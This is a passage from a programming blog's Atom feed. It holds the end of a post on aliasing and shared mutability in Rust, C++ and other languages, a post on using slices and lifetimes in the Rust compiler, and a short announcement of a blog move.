a static guarantee (or you just want to avoid the borrow checker), a single-threaded RWlock-esque type called <a href="https://doc.rust-lang.org/core/cell/struct.RefCell.html">RefCell</a>
is available in Rust. It&rsquo;s a type providing interior mutability and behaves like a runtime version of the borrow checker.
Similar wrappers can be written in other languages.</p>

<p>Edit: In case of many primitives like simple integers, the problems with shared mutability turn out to not be a major issue.
For these, we have a type called <a href="http://doc.rust-lang.org/nightly/std/cell/struct.Cell.html">Cell</a> which lets these be mutated and shared simultaenously. This works on all <code>Copy</code>
types; i.e. types which only need to be copied on the stack to be copied. (Unlike types involving pointers or other indirection)</p>

<p>This sort of bug is a good source of reentrancy problems too.</p>

<h2>Safe abstractions</h2>

<p>In particular, the issue in the previous section makes it hard to write safe abstractions, especially with generic code.
While this problem is clearer in the case of Rust (where abstractions are expected to be safe and preferably low-cost),
this isn&rsquo;t unique to any language.</p>

<p>Every method you expose has a contract that is expected to be followed. Many times, a contract is handled by type safety itself,
or you may have some error-based model to throw out uncontractual data (for example, division by zero).</p>

<p>But, as an API (can be either internal or exposed) gets more complicated, so does the contract. It&rsquo;s not always possible to verify that the contract is being violated
at runtime either, for example many cases of iterator invalidation are hard to prevent in nontrivial code even with asserts.</p>

<p>It&rsquo;s easy to create a method and add documentation &ldquo;the first two arguments should not point to the same memory&rdquo;.
But if this method is used by other methods, the contract can change to much more complicated things that are harder to express
or check. When generics get involved, it only gets worse; you sometimes have no way of forcing that there are no shared mutable aliases,
or of expressing what isn&rsquo;t allowed in the documentation. Nor will it be easy for an API consumer to enforce this.</p>

<p>This makes it harder and harder to write safe, generic abstractions. Such abstractions rely on invariants, and these invariants can often
be broken by the problems in the previous section. It&rsquo;s not always easy to enforce these invariants, and such abstractions will either
be misused or not written in the first place, opting for a heavier option. Generally one sees that such abstractions or patterns are avoided
altogether, even though they may provide a performance boost, because they are risky and hard to maintain. Even if the present version of
the code is correct, someone may change something in the future breaking the invariants again.</p>

<p><a href="http://manishearth.github.io/blog/2015/05/03/where-rust-really-shines/">My previous post</a> outlines a situation where Rust was able to choose
the lighter path in a situation where getting the same guarantees would be hard in C++.</p>

<p>Note that this is a wider problem than just with mutable aliasing. Rust has this problem too, but not when it comes to mutable aliasing.
Mutable aliasing is important to fix however, because we can make a lot of assumptions about our program when there are no mutable aliases.
Namely, by looking at a line of code we can know what happened wrt the locals. If there is the possibility of mutable aliasing out there; there&rsquo;s the
possibility that other locals were modified too. A very simple example is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">look_ma_no_temp_var_l33t_interview_swap</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span> <span class="o">-</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span> <span class="o">-</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="c1">// or</span>
</span><span class='line'><span class="k">fn</span> <span class="n">look_ma_no_temp_var_rockstar_interview_swap</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span> <span class="o">^</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span> <span class="o">^</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
</span><span class='line'>    <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="o">*</span><span class="n">x</span> <span class="o">^</span> <span class="o">*</span><span class="n">y</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>In both cases, when the two references are the same<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, instead of swapping, the two variables get set to zero.
A user (internal to your library, or an API consumer) would expect <code>swap()</code> to not change anything when fed equal
references, but this is doing something totally different. This assumption could get used in a program; for example instead
of skipping the passes in an array sort where the slot is being compared with itself, one might just go ahead with it
because <code>swap()</code> won&rsquo;t change anything there anyway; but it does, and suddenly your sort function fills everything with
zeroes. This could be solved by documenting the precondition and using asserts, but the documentation gets harder and harder
as <code>swap()</code> is used in the guts of other methods.</p>

<p>Of course, the example above was contrived. It&rsquo;s well known that those <code>swap()</code> implementations have that precondition,
and shouldn&rsquo;t be used in such cases. Also, in most swap algorithms it&rsquo;s trivial to ignore cases when you&rsquo;re comparing
an element with itself, generally done by bounds checking.</p>

<p>But the example is a simplified sketch of the problem at hand.</p>

<p>In Rust, since this is statically checked, one doesn&rsquo;t worry much about these problems, and
robust APIs can be designed since knowing when something won&rsquo;t be mutated can help simplify
invariants.</p>

<h2>Wrapping up</h2>

<p>Aliasing that doesn&rsquo;t fit the RWLock pattern is dangerous. If you&rsquo;re using a language like
Rust, you don&rsquo;t need to worry. If you&rsquo;re using a language like C++, it can cause memory unsafety,
so be very careful. If you&rsquo;re using a language like Java or Go, while it can&rsquo;t cause memory unsafety,
it will cause problems in complex bits of code.</p>

<p>This doesn&rsquo;t mean that this problem should force you to switch to Rust, either. If you feel that you
can avoid writing APIs where this happens, that is a valid way to go around it. This problem is much
rarer in languages with a GC, so you might be able to avoid it altogether without much effort. It&rsquo;s
also okay to use runtime checks and asserts to maintain your invariants; performance isn&rsquo;t everything.</p>

<p>But this <em>is</em> an issue in programming; and make sure you think of it when designing your code.</p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=9560158">HN</a>, <a href="http://www.reddit.com/r/rust/comments/369jnx/the_problem_with_singlethreaded_shared_mutability/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Hereafter referred to as &ldquo;The Question&rdquo;<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>Note: <code>Str</code> and <code>Int</code> are variant names which I chose; they are not keywords. Additionally, I&rsquo;m using &ldquo;associated foo&rdquo; loosely here; Rust <em>does</em> have a distinct concept of &ldquo;associated data&rdquo; but it&rsquo;s not relevant to this post.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Note that this isn&rsquo;t possible in Rust due to the borrow checker.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Where Rust Really Shines]]></title>
    <link href="http://manishearth.github.io/blog/2015/05/03/where-rust-really-shines/"/>
    <updated>2015-05-03T04:49:49-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/05/03/where-rust-really-shines</id>
    <content type="html"><![CDATA[<p>Yesterday I was working on a <a href="https://github.com/rust-lang/rust/pull/25027">small feature</a>
for the Rust compiler, and came across a situation which really showcased Rust&rsquo;s
awesomeness as a language.</p>

<p>There was a struct which was exposed to an API,
and I wished to give it access to a list of things known as &ldquo;attributes&rdquo;, where the list was <a href="http://doc.rust-lang.org/std/vec/struct.Vec.html">a heap-allocated vector</a>.</p>

<p>Now, I have two ways of actually giving the struct access to a vector. I can either clone it (i.e. make a copy of its contents),
or use a reference (pointer) to it or its contents.</p>

<p>In a language like C++ there&rsquo;s only once choice in this situation; that is
to clone the vector<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. In a large C++ codebase if I wished to use a pointer I would need to be sure that the vector
isn&rsquo;t deallocated by the time I&rsquo;m done with it, and more importantly, to be sure that no other code pushes to the vector (when a vector overflows its
capacity it will be reallocated, invalidating any other pointers to its contents).</p>

<p>For a smaller codebase this might be possible, but in this specific case it could have taken me a while to become sure of this.
The code was related to the &ldquo;expansion&rdquo; portion of compilation, where the AST is expanded to a bigger AST. A lot of things change and get
moved around, so it is reasonable to assume that it might not be possible to safely use it.
I would have had to find out where the vector is originally stored; all the entry points for the code I was
modifying, and make sure it isn&rsquo;t being mutated (not as hard in Rust, but I would
still need to muck around a large codebase). And then I would have to somehow make sure that nobody tries to mutate it
in the future. This is a task which I would not even consider trying in C++.</p>

<p>However, I had another option here, because this was Rust. In Rust I can store a reference to the contents of the vector
without fear of invalidation, since the compiler will prevent me from using the vector in a way that could cause unsafety.
Such a reference is known as a <a href="http://doc.rust-lang.org/std/primitive.slice.html">slice</a>.</p>

<p>Whilst in C++ I would have to manually go through a lot of code to be sure of safety
(and even after all that be left with code that would be brittle to changes elsewhere
the codebase), in Rust the compiler can do this for me!</p>

<p>Being able to do this was important
&mdash; this code is called quite often for a regular compile, and all those
extra allocations could be heavy, especially given that this was a feature that would be used
by very few.</p>

<p>So first I started off by adding a field to the <code>FieldInfo</code> struct which was a <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R285">slice of attributes</a>. Notice that I added a lifetime specifier, <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R273">the <code>'a</code></a> to the struct definition.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c-Doc">/// Summary of the relevant parts of a struct/enum field.</span>
</span><span class='line'><span class="k">pub</span> <span class="k">struct</span> <span class="n">FieldInfo</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c-Doc">/// ...</span>
</span><span class='line'>    <span class="c-Doc">/// The attributes on the field</span>
</span><span class='line'>    <span class="k">pub</span> <span class="n">attrs</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="p">[</span><span class="n">ast</span><span class="o">::</span><span class="n">Attribute</span><span class="p">],</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>For those of you new to Rust, a lifetime is part of the type of a reference. It&rsquo;s related to the scope of the reference, and generally can be treated as
a generic parameter. So, for example, here, I have a <code>FieldInfo</code> with a lifetime parameter of <code>'a</code> where <code>'a</code> is the lifetime of the inner slice of attributes.
If I construct this struct with slices from different scopes, its type will be different each time. Lifetimes can get automatically cast depending on their context however,
and quite often they get elided away, so one doesn&rsquo;t need to specify them that much (aside from struct/enum definitions). You can find more information <a href="http://doc.rust-lang.org/nightly/book/ownership.html#lifetimes">in the Rust book</a></p>

<p>I then updated code everywhere to pass the attributes from <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R1440">their source</a>
to <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R1155">their destination</a> through the chained methods.</p>

<p>An important thing to note here is that none of the lifetime specifiers you see now in the commit were added when I did this. For example, <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R1410">the return value
of <code>create_struct_pattern</code></a> was
<code>(P&lt;ast::Pat&gt;, Vec&lt;(Span, Option&lt;Ident&gt;, P&lt;Expr&gt;, &amp;[ast::Attribute])&gt;)</code> at this point, not <code>(P&lt;ast::Pat&gt;, Vec&lt;(Span, Option&lt;Ident&gt;, P&lt;Expr&gt;, &amp;'a [ast::Attribute])&gt;)</code>.
You can ignore the complicated types being passed around, for now just pretend that a slice of attributes was returned.</p>

<p>Now comes the magic. After these small changes necessary for the feature, I basically let the compiler do the rest of the work. See, at this point the code was wrong.
I had forgotten lifetime specifiers in places where they were important, and still wasn&rsquo;t sure if storing a reference would in fact be possible in the first place.
However, the compiler was smart enough to figure things out for me. It would tell me to add lifetime specifiers, and I would add them.</p>

<p>First, the compiler asked me to add <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R297">a lifetime to the <code>FieldInfo</code> parts of <code>SubstructureFields</code></a>. So, the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">enum</span> <span class="n">SubstructureFields</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Struct</span><span class="p">(</span><span class="n">Vec</span><span class="o">&lt;</span><span class="n">FieldInfo</span><span class="o">&gt;</span><span class="p">),</span>
</span><span class='line'>    <span class="n">EnumMatching</span><span class="p">(</span><span class="n">usize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">ast</span><span class="o">::</span><span class="n">Variant</span><span class="p">,</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="n">FieldInfo</span><span class="o">&gt;</span><span class="p">),</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>became</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">enum</span> <span class="n">SubstructureFields</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Struct</span><span class="p">(</span><span class="n">Vec</span><span class="o">&lt;</span><span class="n">FieldInfo</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;&gt;</span><span class="p">),</span>
</span><span class='line'>    <span class="n">EnumMatching</span><span class="p">(</span><span class="n">usize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">ast</span><span class="o">::</span><span class="n">Variant</span><span class="p">,</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="n">FieldInfo</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;&gt;</span><span class="p">),</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This needed to happen because elision doesn&rsquo;t work for structs and enums,
and besides, the compiler would need to know if the <code>&amp;ast::Variant</code> was supposed to be the same lifetime as the parameter of the <code>FieldInfo</code>s. I decided
to just use the existing <code>'a</code> parameter, which meant that yes, the <code>&amp;ast::Variant</code> was supposed to live just as long. I could also have opted to give the <code>FieldInfo</code>s
a different lifetime by adding a <code>'b</code> parameter, but I guessed that it would work this way too (knowing the origin of the fieldinfo and variant, and that implicit lifetime casting would
fix most issues that cropped up). I didn&rsquo;t need to think this out much, though &mdash; the compiler gave me a suggestion and I could simply copy it.</p>

<p>The next error was in <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R1463"><code>create_enum_variant_pattern()</code></a>
and <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R1404"><code>create_struct_pattern()</code></a> as well as some other places.</p>

<p>Here, the method had a signature of</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">create_enum_variant_pattern</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">cx</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">ExtCtxt</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">enum_ident</span><span class="o">:</span> <span class="n">ast</span><span class="o">::</span><span class="n">Ident</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">variant</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">ast</span><span class="o">::</span><span class="n">Variant</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">prefix</span><span class="o">:</span> <span class="o">&amp;</span><span class="kt">str</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">mutbl</span><span class="o">:</span> <span class="n">ast</span><span class="o">::</span><span class="n">Mutability</span><span class="p">)</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="p">(</span><span class="n">P</span><span class="o">&lt;</span><span class="n">ast</span><span class="o">::</span><span class="n">Pat</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="p">(</span><span class="n">Span</span><span class="p">,</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="n">Ident</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">ast</span><span class="o">::</span><span class="n">Attribute</span><span class="p">])</span><span class="o">&gt;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>and I changed it to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">create_enum_variant_pattern</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">cx</span><span class="o">:</span> <span class="o">&amp;</span><span class="k">mut</span> <span class="n">ExtCtxt</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">enum_ident</span><span class="o">:</span> <span class="n">ast</span><span class="o">::</span><span class="n">Ident</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">variant</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">ast</span><span class="o">::</span><span class="n">Variant</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">prefix</span><span class="o">:</span> <span class="o">&amp;</span><span class="kt">str</span><span class="p">,</span>
</span><span class='line'>                               <span class="n">mutbl</span><span class="o">:</span> <span class="n">ast</span><span class="o">::</span><span class="n">Mutability</span><span class="p">)</span>
</span><span class='line'><span class="o">-&gt;</span> <span class="p">(</span><span class="n">P</span><span class="o">&lt;</span><span class="n">ast</span><span class="o">::</span><span class="n">Pat</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">Vec</span><span class="o">&lt;</span><span class="p">(</span><span class="n">Span</span><span class="p">,</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="n">Ident</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="p">[</span><span class="n">ast</span><span class="o">::</span><span class="n">Attribute</span><span class="p">])</span><span class="o">&gt;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>In this case, the code was uncomfortable with taking a slice of attributes out of an arbitrary <code>StructDef</code> reference and returning it. What if the <code>StructDef</code> doesn&rsquo;t live long enough?
Generally the compiler internally figures out the lifetimes necessary and uses them here, but if you have too many references there&rsquo;s no single way to make the fix.
In this case, the compiler suggested I add a <code>'a</code> to <code>&amp;StructDef</code> and the returned <code>&amp;[Attribute]</code>, and I did so. The <code>'a</code> lifetime was declared at <a href="https://github.com/Manishearth/rust/blob/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b/src/libsyntax/ext/deriving/generic/mod.rs#L379">the top of the impl</a>, so it was the lifetime parameter of <code>self</code><sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. This meant that the returned attribute of the function will
have a lifetime tied to <code>self</code> and the input <code>StructDef</code>, and due to this it cannot outlive the inputs, which is what we wanted in the first place. In essence, I took a bit of code that was doing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">minicreate</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">variant</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">ast</span><span class="o">::</span><span class="n">Variant</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="p">[</span><span class="n">ast</span><span class="o">::</span><span class="n">Attribute</span><span class="p">]</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// do stuff</span>
</span><span class='line'>    <span class="c1">// return variant.attributes</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>and changed it to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// we are sure that the returned slice cannot outlive the variant argument</span>
</span><span class='line'><span class="k">fn</span> <span class="n">minicreate</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span> <span class="n">variant</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">ast</span><span class="o">::</span><span class="n">Variant</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="p">[</span><span class="n">ast</span><span class="o">::</span><span class="n">Attribute</span><span class="p">]</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// do stuff</span>
</span><span class='line'>    <span class="c1">// return variant.attributes</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Again, I didn&rsquo;t need to think this out much (I&rsquo;m only thinking it through now for this blog post). I followed the suggestion given to me by the compiler:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>error: cannot infer an appropriate lifetime for automatic coercion due to conflicting requirements
</span><span class='line'>help: consider using an explicit lifetime parameter as shown: fn create_enum_variant_pattern&lt;&#39;a&gt;(&amp;self, cx: &amp;mut ExtCtxt, enum_ident: ast::Ident, variant: &amp;&#39;a ast::Variant, prefix: &amp;str, mutbl: ast::Mutability) -&gt; (P&lt;ast::Pat&gt;, Vec&lt;(Span, Option&lt;Ident&gt;, P&lt;Expr&gt;, &amp;&#39;a [ast::Attribute])&gt;)
</span></code></pre></td></tr></table></div></figure>


<p>There were a couple of similar errors elsewhere that were caused by tying these two lifetimes together. Since these methods were chained, updating the lifetimes of a child method
would mean that I would have to now update the parent method which passes its arguments down to the children and returns a modification of its return value (and thus must now impose the
same restrictions on its own signature). All of this was done by just listening to the suggestions of the compiler (which all contain a function signature to try out). In <a href="https://github.com/Manishearth/rust/commit/ede7a6dc8ff5455f9d0d39a90e6d11e9a374e93b#diff-6fa0bf762b2ef85690cce1a0fd8d5a20R890">some cases</a> I introduced a <code>'b</code> lifetime, because tying it to <code>'a</code>
(the self lifetime parameter) was possibly too restrictive. All of this at the suggestion of the compiler.</p>

<p>While this all seems long and complicated, in reality it wasn&rsquo;t. I simply added the field to the initial struct, tried compiling a couple of times to figure out which code needed updating
to pass around the attributes, and then went through 3-4 more compilation attempts to fix the lifetimes. It didn&rsquo;t take long, and I didn&rsquo;t need to put much mental effort into it. I just
listened to the compiler, and it worked.</p>

<p>And now I trust completely that that code will not cause any segfaults due to attempted access of a destroyed or moved vector. And this is despite the fact that I <em>still</em> don&rsquo;t know
where that particular vector is modified or destroyed &mdash; I didn&rsquo;t explore that far because I didn&rsquo;t need to! (or want to :P)</p>

<p>And this is one place Rust really shines. It lets you do optimizations which you wouldn&rsquo;t dream of doing in C++. In fact, while the C++ way of looking at this problem
would probably be to just clone and move on, most Rust programmers would think of using slices as the default, and not even consider it an &ldquo;optimization&rdquo;. And again, this wasn&rsquo;t
with much cognitive overhead; I could just follow the compiler and it fixed everything for me.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Some people have pointed out that a shared pointer to the vector itself would work here too. This is correct, but a shared pointer also has a runtime overhead, and more importantly doesn&rsquo;t prevent iterator invalidation. I had no idea how the vector was being used elsewhere, so this was a risk I didn&rsquo;t want to take. Additionally, whilst a shared pointer to the vector itself is immune to the issue of the vector being moved, since this was an API, someone consuming the API might take a reference of an attribute and hold on to it long enough for it to become invalidated. This is something we can&rsquo;t have either &ndash; an API consumer should not have to worry about where the pointers will invalidate.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>Note: This is not the lifetime of the reference <code>&amp;self</code>, which is the lifetime of the pointer (<code>&amp;'b self</code>), but the lifetime parameter of <code>self</code>, a <code>TraitDef&lt;'a&gt;</code>, which has a lifetime parameter for its child fields.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[New Blog!]]></title>
    <link href="http://manishearth.github.io/blog/2015/05/03/new-blog/"/>
    <updated>2015-05-03T04:08:12-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/05/03/new-blog</id>
    <content type="html"><![CDATA[<p>I&rsquo;ll be moving from my <a href="http://inpursuitoflaziness.blogspot.in/">old Blogger-powered blog</a>
to this new one powered by github pages and Octopress. I never enjoyed writing a blog in WYSIWYG
or HTML (I would constantly switch between both and still get the formatting wrong); Markdown is
my cup of tea.</p>

<p>I may &ldquo;uplift&rdquo; some of my favorite posts to this blog later.</p>

<p>I&rsquo;m quite excited!</p>
]]></content>
  </entry>
  
</feed>
